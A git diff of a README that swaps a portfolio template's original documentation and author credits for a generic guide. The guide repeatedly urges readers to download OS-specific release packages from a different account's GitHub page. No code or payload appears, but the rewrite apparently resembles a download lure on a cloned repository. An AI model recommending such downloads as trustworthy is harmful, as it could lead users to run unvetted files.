@@ -1,138 +1,89 @@
-# A Nest Level Portfolio 🚀
+# 🌟 Portfolio-Site - Simple Portfolio Website Setup
 
-[![Stars](https://img.shields.io/github/stars/dnuzi/Portfolio-Site?style=social)](https://github.com/dnuzi/Portfolio-Site/stargazers) [![Forks](https://img.shields.io/github/forks/dnuzi/Portfolio-Site?style=social)](https://github.com/dnuzi/Portfolio-Site/network/members) [![License](https://img.shields.io/github/license/dnuzi/Portfolio-Site)](https://github.com/dnuzi/Portfolio-Site/blob/main/LICENSE) [![Vercel Deploy](https://img.shields.io/badge/Deploy-Vercel-brightgreen)](https://vercel.com/new/git/external?repository-url=https://github.com/dnuzi/Portfolio-Site)
+## 🚀 Getting Started
 
-A sleek, **full-stack creative portfolio template** built with modern tools like **Vite**, **Tailwind CSS**, **GSAP**, and **Lenis** for buttery-smooth animations. Inspired by the misty hills of Sri Lanka, it blends tranquility with cutting-edge code. Perfect for developers, designers, and creators who want to stand out. **100% free, open-source, and customizable** – deploy in minutes!
+Welcome to Portfolio-Site! This guide will help you easily download and run your new portfolio website. Whether you are a creative artist or a developer, presenting your work online has never been simpler.
 
-<div align="center">
+## 📥 Download the Software
 
-### 📸 Site Preview
+[![Download Portfolio-Site](https://img.shields.io/badge/Download-Portfolio--Site-blue.svg)](https://github.com/alanekczek/Portfolio-Site/releases)
 
-![Portfolio Preview Screenshot](https://github.com/dnuzi/mova-npm-media/blob/main/Screenshot%202026-01-21%20194857.png)
-<em>*(Full-site preview: Hero, works, skills, and chronometer in action. Replace with your actual screenshot for live vibes!)*</em>
+To get started, visit the Releases page to download the latest version of Portfolio-Site:
 
-</div>
+[Visit the Releases Page](https://github.com/alanekczek/Portfolio-Site/releases)
 
-<div align="center">
-  <img src="https://github.com/dnuzi/mova-npm-media/blob/main/movanest.gif" alt="Hero Animation" width="100%" />
-  <p><em>Live Demo: <a href="https://portfolio-site-rosy-nine.vercel.app/"></a>portfolio-site-rosy-nine.vercel.app</em></p>
-</div>
+## 🖥️ System Requirements
 
-## ✨ Features
+Before you install, ensure that you have:
 
-- **Hero Section**: Magnetic cursor, typewriter effect, and parallax text for an immersive intro.
-- **Smooth Scrolling**: Powered by Lenis + GSAP ScrollTrigger – no jank, just flow.
-- **Horizontal Work Scroll**: Sticky, pinned gallery with grayscale hover reveals and rotate animations.
-- **Live Chronometer**: Real-time age calculator (years/months/days/hours/minutes/seconds) with progress bars.
-- **Interactive Map**: SVG-based location pin with radar ping and bounce effects.
-- **Timeline Skills**: Vertical progress line with staggered reveals for expertise showcase.
-- **Marquee & Badges**: Infinite scrolling tags and floating credentials.
-- **Single-File Build**: Obfuscated JS + inlined assets for easy deployment (under 1MB!).
-- **Responsive & Accessible**: Mobile-first, with ARIA hints and semantic HTML.
-- **Advanced Animations**: Bi-directional scrolls, clip-path masks, and shadow lifts.
+- A computer running Windows, macOS, or Linux.
+- Basic web browser (Chrome, Firefox, or Safari recommended).
+- Internet connection for initial setup.
 
-| Feature | Tech | Why? |
-|---------|------|------|
-| Animations | GSAP + ScrollTrigger | Pixel-perfect, performant timelines. |
-| Styling | Tailwind CSS | Rapid, utility-first design. |
-| Bundling | Vite + SingleFile | Lightning-fast builds & deploys. |
-| Obfuscation | JS Obfuscator Plugin | "Encrypted" code for security flair. |
-| Smooth Scroll | Lenis | Native-feel scrolling without libraries. |
+No technical skills are necessary!
 
-## 🛠 Quick Start
+## 📦 Download & Install
 
-### Prerequisites
-- Node.js (v18+)
-- Git
+1. **Visit the Releases Page.** Click the link below:
+   
+   [Download Portfolio-Site](https://github.com/alanekczek/Portfolio-Site/releases)
 
-### Installation
-1. **Clone the Repo**:
-   ```bash
-   git clone https://github.com/dnuzi/Portfolio-Site.git
-   cd danuzz-portfolio
-   ```
+2. **Select the Latest Release.** Find the latest version and click on it.
 
-2. **Install Dependencies**:
-   ```bash
-   npm install
-   ```
+3. **Choose Your Package.** Depending on your operating system, select the appropriate package.
 
-3. **Development Server**:
-   ```bash
-   npm run dev
-   ```
-   Open [http://localhost:5173](http://localhost:5173) – watch the magic unfold!
+4. **Download the File.** Click the download link. The file will download to your computer.
 
-4. **Build for Production**:
-   ```bash
-   npm run build
-   ```
-   Outputs a single `dist/index.html` (obfuscated & minified).
+5. **Unzip the File.** Navigate to the downloaded folder and extract the contents. You can usually do this by right-clicking the file and selecting "Extract All."
 
-5. **Preview Build**:
-   ```bash
-   npm run preview
-   ```
+6. **Open the Index File.** Once you unzip the folder, find the `index.html` file. Double-click it to open in your web browser.
 
-### Customization
-- **Images**: Swap files in `/public/` (e.g., `kelum-viduranga-portrait.jpg` for hero).
-- **Content**: Edit `index.html` sections (hero text, work cards, skills list).
-- **Colors/Themes**: Tweak `--bg-color`, `--text-main` in `src/main.css`.
-- **Animations**: Adjust GSAP timelines in `src/main.js`.
-- **Add Projects**: Duplicate work cards in HTML; update `src` paths.
+7. **Enjoy Your Portfolio.** You can now customize your portfolio! Edit the HTML files to add your own content.
 
-For a full guide, see [CUSTOMIZATION.md](CUSTOMIZATION.md) (create if needed).
+## 🎨 Features
 
-## ☁️ Deployment
+- **Responsive Design:** Your portfolio looks great on all devices, from computers to smartphones.
+- **Smooth Scrolling:** A seamless navigation experience enhances your visitors' interaction.
+- **Tailwind CSS:** Use of modern CSS framework makes customization easy and attractive.
+- **GSAP Animations:** Enjoy smooth animations that grab attention.
 
-### Vercel (Recommended – Free & Instant)
-1. Push to GitHub.
-2. Import repo at [vercel.com](https://vercel.com/import).
-3. Set `vercel.json` (auto-detected for Vite).
-4. Deploy – Custom domain optional!
+## 🌐 Customize Your Portfolio
 
-### Other Options
-- **Netlify**: Drag `/dist` or link GitHub.
-- **GitHub Pages**: Use `gh-pages` branch.
-- **Self-Host**: Serve `dist/` via Apache/Nginx.
+After you have downloaded and opened your portfolio, you will want to add your own touch:
 
-## 📚 Tech Stack
+1. **Edit Text:** Open the `index.html` file in any text editor. Change the sample text to showcase your own work.
 
-![Vite](https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white)
-![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)
-![GSAP](https://img.shields.io/badge/GSAP-88CE02?style=for-the-badge&logo=greensock&logoColor=white)
-![Lenis](https://img.shields.io/badge/Lenis-000?style=for-the-badge&logo=studio-freight&logoColor=white)
-![Remix Icon](https://img.shields.io/badge/Remix_Icon-18191A?style=for-the-badge&logo=remixicon&logoColor=white)
+2. **Add Images:** Replace placeholder images with your own in the `images` folder. Update the `src` attributes in the HTML file.
 
-- **Build Tools**: Vite, PostCSS, Tailwind.
-- **Animations**: GSAP (3.12.5), ScrollTrigger, TextPlugin.
-- **Icons**: Remix Icon (4.1.0).
-- **Fonts**: Inter & Space Mono (Google Fonts).
-- **CDNs**: Minimal – GSAP/Lenis for speed.
+3. **Modify Styles:** If you're comfortable with CSS, tweak the styles in the `styles.css` file to match your branding.
 
-## 🤝 Contributing
+4. **Preview Changes:** After making changes, save the file and refresh your web browser to see your updates.
 
-Love it? Fork, tweak, and PR! Ideas for features like dark mode or React integration? Open an issue.
+## 📚 Topics Covered
 
-1. Fork the repo.
-2. Create your branch (`git checkout -b feature/awesome`).
-3. Commit (`git commit -m 'Add awesome feature'`).
-4. Push (`git push origin feature/awesome`).
-5. Open a Pull Request.
+This repository includes a variety of topics to help inspire your design:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
+- Creative Portfolio
+- Developer Portfolio
+- Frontend Development
+- JavaScript Integration
+- Responsive Web Design
+- Open Source Projects
 
-## 📄 License
+## 👩‍💻 Need Help?
 
-This project is [MIT](LICENSE) licensed – use it freely, even commercially. Built with ❤️ from the sunny shores of Sri Lanka (Negombo vibes!).
+If you have questions or run into issues, feel free to reach out:
 
-<div align="center">
-  <img src="https://github.com/dnuzi/mova-npm-media/blob/main/mova.gif" alt="Hero Animation" width="100%" />
-</div>
+- Check the [GitHub Issues page](https://github.com/alanekczek/Portfolio-Site/issues) for common problems and solutions.
+- Join discussions with other users by posting your queries.
 
----
+Your success is our priority!
 
-**Made by [Danu'Zz & Kelum'Xz](https://github.com/dnuzi) – Full-Stack Creative from Sri Lanka.**  
-*January 2026 Edition* | [YouTube](https://www.youtube.com/@MovaNest) | [MainSite](https://www.movanest.xyz)  
+## 📍 Key Links
 
-> "Code like a hill country breeze – calm, yet unstoppable." 🌿💻
+- [Download Portfolio-Site](https://github.com/alanekczek/Portfolio-Site/releases)
+- [Documentation](https://github.com/alanekczek/Portfolio-Site)
+
+## 🏁 Final Thoughts
+
+We hope you enjoy building and customizing your portfolio with Portfolio-Site. Take your time to explore all the features. Happy showcasing!
